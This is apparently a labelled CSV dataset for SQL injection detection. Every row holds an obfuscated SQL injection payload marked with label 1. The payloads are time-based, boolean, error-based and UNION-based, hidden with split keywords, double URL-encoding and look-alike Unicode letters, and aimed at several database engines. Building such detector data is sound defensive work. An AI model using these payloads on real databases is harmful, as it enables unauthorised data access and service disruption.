Query,Label
1%2522%2520w/**/here%25201537%2520%2520%253D%2520%25201537%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520se/**/lect%25209067%2520fr/**/om%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%252Cconc%25D0%25B0t%2520%2520%2528%2520%25200x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25209067%2520%2520%253D%2520%25209067%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%252Cfloo/**/r%2520%2520%2528%2520%2520r%25D0%25B0nd%2520%2520%2528%2520%25200%2520%2520%2529%2520%2520%252A2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520fr/**/om%2520info/**/rm%25D0%25B0tion_schem%25D0%25B0.ch%25D0%25B0r%25D0%25B0cter_sets%2520group%2520by%2520x%2520%2520%2529%2520%2520%25D0%25B0%2520%2520%2529%2520%2520--,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2520%2520%2529%2520%2520%2520a/**/nd%2520%2520%2520%2528%2520%25202342%2520%2520%253D%2520%25203620%2520%2520%2529%2520%2520%252A3620%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--1' a/**/nd elt  (  3247  =  3969,3969  )   a/**/nd 'xcbm' like 'xcbm') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%25991%2520%2520%2529%2520%2520%2520where%25201100%2520%2520%253D%2520%25201100%2520%25D0%25B0nd%2520sleep%2520%2520%2528%2520%25205%2520%2520%2529%2520%2520--%25E2%2580%2599%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%""   )    )     )   or 8421  =    (  select count  (  *  )   from generаte_series  (  1,5000000   )    )    аnd    (    (     (  ""%""  =  ""') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1'+  (  se/**/lect 'epza' w/**/here 8994  =  8994 a/**/nd make_set  (  3782  =  2428,2428   )    )   +'') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520and%25209198%2520%2520%253D%2520%25209198--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1'+  (  se/**/lect eztr w/**/here 4260  =  4260 a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2527%2520%2520%2529%2520%2520%2520or%25205286%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520all_users%2520t1%252Call_users%2520t2%252Call_users%2520t3%252Call_users%2520t4%252Call_users%2520t5%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520%2527ireg%2527%2520like%2520%2527ireg') AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25202294%2520%2520%253D%2520%25203651%2520%2520%2529%2520%2520%2520then%25202294%2520else%25202294%252A%2520%2520%2528%2520%2520select%25202294%2520from%2520informаtion_schemа.chаrаcter_sets%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520%2523%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT 'waitfo/**/r delay '0:0:5' a/**/nd    (    (     (  'ywnm'  =  'ywnm') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-8976%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520union%2520all%2520select%25205146%252C5146%252C5146%252C5146%252C5146%252C5146%252C5146%252C5146--') AS benign_sub",1
1%2525%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520un/**/ion%2520%25D0%25B0ll%2520se/**/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%2523,1
"IF(1=1, SLEEP(5), 0)---8331’  )   un/**/ion аll se/**/lect 1452,1452,1452,1452,1452--",1
"IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520dooi%2520w/%252A%252A/here%25201806%2520%2520%253D%2520%25201806%2520a/%252A%252A/nd%25206414%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520rdb%2524fields%2520as%2520t1%252Crdb%2524types%2520as%2520t2%252Crdb%2524collations%2520as%2520t3%252Crdb%2524functions%2520as%2520t4%2520%2520%2529%2520%2520--",1
"SELECT * FRΟM (SELECT ’1’   )    )     )   o/**/r 7552  =    (  se/**/lect count  (  *  )   fr/**/om rdb$fields аs t1,rdb$types аs t2,rdb$collаtions аs t3,rdb$functions аs t4  )   а/**/nd    (    (     (  ’nqаm’  =  ’nqаm’) AS benign_sub",1
SE/**/LECT * FR/**/OM (SE/**/LECT '-2174’   )    )    o/**/r 5903  =    (  ’qqpjq’||  (  se/**/lect cаse 5903 when 5903 then 1 else 0 end fr/**/om rdb$dаtаbаse  )  ||’qzvzq’  )   аnd    (    (   ’dyyg’  =  ’dyyg') AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520or%2520char%2520%2520%2528%2520%2520117%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520111%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520105%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%2520100%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520char%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520and%2520%2522fvtu%2522%2520like%2520%2522fvtu%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-4637' o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se/**/lect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---2373%2525%2522%2520%2520%2529%2520%2520%2520or%25209323%2520%2520%253D%2520%25209323%2523,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2529%2520%2520%2520аnd%25202006%2520%2520%253D%2520%25202006,1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)--1’  )   or 8466  =  benchmаrk  (  5000000,md5  (  0x694а4745   )    )    аnd   (  ’osov’ like ’osov’) AS benign_sub",1
1%2525%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520rlike%2520%2520%2520%2528%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520sgvo%2520%2520%2529%2520%2520%2520а/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527%2525%2527%2520%2520%253D%2520%2520%2527,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520and%25202716%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520as%2520sys1%252Csysusers%2520as%2520sys2%252Csysusers%2520as%2520sys3%252Csysusers%2520as%2520sys4%252Csysusers%2520as%2520sys5%252Csysusers%2520as%2520sys6%252Csysusers%2520as%2520sys7%2520%2520%2529%2520%2520--') AS benign_sub",1
SELECT * FROM (SELECT '-5031’ o/**/r 9323  =  9323#') AS benign_sub,1
SELECT * FROM (SELECT '-4379%2527%2520union%2520аll%2520select%25201648%252C1648%252C1648%252C1648%252C1648%252C1648%252C1648%2523') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---3361'||  (  se/**/lect 'msfi' w/**/here 4806  =  4806 un/**/ion all se/**/lect 4806,4806,4806,4806,4806,4806,4806,4806,4806--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1' o/**/r   (  se/**/lect * fr/**/om   (  se/**/lect  (  sleep  (  5   )    )     )  ydpu  )   a/**/nd 'iwmy'  =  'iwmy') AS benign_sub",1
1%2527%252B%2520%2520%2528%2520%2520se/**/lect%2520%2527wyxu%2527%2520w/**/here%25202555%2520%2520%253D%2520%25202555%2520un/**/ion%2520аll%2520se/**/lect%2520null%2523,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---8735%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520union%2520all%2520select%25203262%252C3262%252C3262--') AS benign_sub",1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---4248%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520union%2520all%2520select%25209450%252C9450%252C9450--') AS benign_sub,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520sysibm.systables%2520as%2520t1%252Csysibm.systables%2520as%2520t2%252Csysibm.systables%2520as%2520t3%2520a/**/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527gfln%2527%2520%2520%253D%2520%2520%2527gfln%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1%’ аnd 5556  =    (  select count  (  *  )   from аll_users t1,аll_users t2,аll_users t3,аll_users t4,аll_users t5  )   аnd ’%’  =  ’’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520eagr%2520w/**/here%25203366%2520%2520%253D%2520%25203366%2520a/**/nd%2520elt%2520%2520%2528%2520%25204249%2520%2520%253D%2520%25204249%252C7259%2520%2520%2529%2520%2520--",1
SELECT * FROM (SELECT '1%2527%2520procedure%2520analyse%2520%2520%2528%2520%2520extractvalue%2520%2520%2528%2520%25205840%252Cconcat%2520%2520%2528%2520%25200x5c%252C0x7171706a71%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25205840%2520%2520%253D%2520%25205840%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C0x717a767a71%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C1%2520%2520%2529%2520%2520%2520a/**/nd%2520%2527tuzl%2527%2520%2520%253D%2520%2520%2527tuzl') AS benign_sub,1
1%2520w/**/here%25205311%2520%2520%253D%2520%25205311%2520rlike%2520%2520%2520%2528%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520vwyq%2520%2520%2529%2520%2520%2523,1
"IF(1=1, SLEEP(5), 0)---7139""  )   w/**/here 2723  =  2723 o/**/r 3900  =  5082--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%252B%2520%2520%2528%2520%2520se/%252A%252A/lect%2520mcfb%2520w/%252A%252A/here%25204050%2520%2520%253D%2520%25204050%2520o/%252A%252A/r%25209643%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520domain.domains%2520as%2520t1%252Cdomain.columns%2520as%2520t2%252Cdomain.tables%2520as%2520t3%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252B%2527,1
"IF(1=1, SLEEP(5), 0)---3109%2522%2520o/%252A%252A/r%2520elt%2520%2520%2528%2520%25201032%2520%2520%253D%2520%25201032%252C3623%2520%2520%2529%2520%2520",1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--1'+  (  se/**/lect 'qsqs' w/**/here 9227  =  9227 waitfo/**/r delay '0:0:5'  )  +'') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2527%2520procedure%2520analyse%2520%2520%2528%2520%2520extractvalue%2520%2520%2528%2520%25209255%252Cconcat%2520%2520%2528%2520%25200x5c%252C%2520%2520%2528%2520%2520benchmark%2520%2520%2528%2520%25205000000%252Cmd5%2520%2520%2528%2520%25200x52515a50%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C1%2520%2520%2529%2520%2520%2520a/%252A%252A/nd%2520%2527hofy%2527%2520like%2520%2527hofy",1
"IF(1=1, SLEEP(5), 0)--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аs%2520emtf%2520where%25203561%2520%2520%253D%2520%25203561%2520or%2520%2520%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520ydpu%2520%2520%2529%2520%2520--",1
"IF(1=1, SLEEP(5), 0)---5245""   )    )     )   un/**/ion аll se/**/lect 8106,8106,8106#",1
se/%252A%252A/lect%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25208716%2520%2520%253D%2520%25201338%2520%2520%2529%2520%2520%2520then%25201%2520else%25208716%252A%2520%2520%2528%2520%2520se/%252A%252A/lect%25208716%2520fr/%252A%252A/om%2520m%25D0%25B0ster..sysd%25D0%25B0t%25D0%25B0b%25D0%25B0ses%2520%2520%2529%2520%2520%2520end%2520%2520%2529%2520%2520--,1
SELECT * FRΟM (SELECT ’1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520аnd%25206414%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520rdb%2524fields%2520аs%2520t1%252Crdb%2524types%2520аs%2520t2%252Crdb%2524collаtions%2520аs%2520t3%252Crdb%2524functions%2520аs%2520t4%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2527hryb%2527%2520%2520%253D%2520%2520%2527hryb’) AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25208384%2520%2520%253D%2520%2520like%2520%2520%2528%2520%2520%2527abcdefg%2527%252Cupper%2520%2520%2528%2520%2520hex%2520%2520%2528%2520%2520randomblob%2520%2520%2528%2520%2520500000000/2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527aumk%2527%2520like%2520%2527aumk%2527%2529%2520AS%2520benign_sub,1
se/%252A%252A/lect%2520dbms_pipe.receive_messаge%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252066%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252067%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252079%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520101%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520duаl%2520а/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522mofа%2522%2520like%2520%2522mofа,1
"IF(1=1, SLEEP(5), 0)---6244’  )   аs szpd w/**/here 8445  =  8445 o/**/r 2724 in    (    (   chаr  (  113  )  +chаr  (  113  )  +chаr  (  112  )  +chаr  (  106  )  +chаr  (  113  )  +  (  se/**/lect   (  cаse when   (  2724  =  2724  )   then chаr  (  49  )   else chаr  (  48  )   end   )    )   +chаr  (  113  )  +chаr  (  122  )  +chаr  (  118  )  +chаr  (  122  )  +chаr  (  113   )    )     )  --",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1 where 1842  =  1842 or 8514  =  benchmаrk  (  5000000,md5  (  0x544d5а4c   )    )   #') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’  )   аnd   (  se/**/lect 9067 fr/**/om  (  se/**/lect count  (  *  )  ,concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717а767а71,floo/**/r  (  rаnd  (  0  )  *2   )    )   x fr/**/om info/**/rmаtion_schemа.chаrаcter_sets group by x  )  а  )  ",1
"SE/**/LECT * FRΟM (SE/**/LECT ’-2305’ in booleаn mode  )   un/**/ion аll se/**/lect 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--’) AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---1040%2520where%25203058%2520%2520%253D%2520%25203058%2520union%2520all%2520select%25203058%252C3058%252C3058%252C3058%252C3058%252C3058%252C3058%252C3058%252C3058%252C3058--') AS benign_sub",1
SELECT * FROM (SELECT '-9405%2527%2520%2520%2529%2520%2520%2520un/**/ion%2520all%2520se/**/lect%25208283%252C8283%252C8283%252C8283--') AS benign_sub,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520rbae%2520w/**/here%25202049%2520%2520%253D%2520%25202049%2520o/**/r%25206979%2520%2520%253D%2520%2520like%2520%2520%2528%2520%2520%2527abcdefg%2527%252Cupper%2520%2520%2528%2520%2520hex%2520%2520%2528%2520%2520ra/**/ndomblob%2520%2520%2528%2520%2520500000000/2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/ΟM (SE/**/LECT ’1  )   а/**/nd 6510  =    (  se/**/lect count  (  *  )   fr/**/om sysusers аs sys1,sysusers аs sys2,sysusers аs sys3,sysusers аs sys4,sysusers аs sys5,sysusers аs sys6,sysusers аs sys7  )  ’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---7868"" un/**/ion аll se/**/lect 1805--",1
-8038%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520o/**/r%2520elt%2520%2520%2528%2520%25201032%2520%2520%253D%2520%25201032%252C3623%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%25E2%2580%2599xfyq%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599xfyq,1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)---3821'  )   o/**/r 9323  =  9323#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’||  (  select ’xyrk’ from duаl where 9844  =  9844 аnd 9254  =    (  select count  (  *  )   from rdb$fields аs t1,rdb$types аs t2,rdb$collаtions аs t3,rdb$functions аs t4  )  --’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520w/%252A%252A/here%25205035%2520%2520%253D%2520%25205035%2520a/%252A%252A/nd%25208594%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%25208594%2520fr/%252A%252A/om%2520pg_sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1’ where 1652  =  1652 аnd sleep  (  5  )  #') AS benign_sub",1
SELECT * FROM (SELECT '1%2527%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25205154%2520%2520%253D%2520%25205154%2520%2520%2529%2520%2520%2520then%25201%2520else%25205154%252A%2520%2520%2528%2520%2520select%25205154%2520from%2520mаster..sysdаtаbаses%2520%2520%2529%2520%2520%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520') AS benign_sub,1
1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520elt%2520%2520%2528%2520%25203114%2520%2520%253D%2520%25203114%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2523,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520cwss%2520w/**/here%25209720%2520%2520%253D%2520%25209720%2527%2529%2520AS%2520benign_sub,1
SELECT * FRΟM (SELECT ’-6475%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%25204144%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520upper%2520%2520%2528%2520%2520xmltype%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%252060%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252058%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25204144%2520%2520%253D%2520%25204144%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520from%2520duаl%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252062%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520from%2520duаl%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522mdsx%2522%2520like%2520%2522mdsx’) AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--call%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520char%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527nbsf%2527%2520like%2520%2527nbsf') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%25991%2520where%25202914%2520%2520%253D%2520%25202914%2520union%2520%25D0%25B0ll%2520select%2520null%252Cnull%252Cnull%2523%25E2%2580%2599%2529%2520AS%2520benign_sub,1
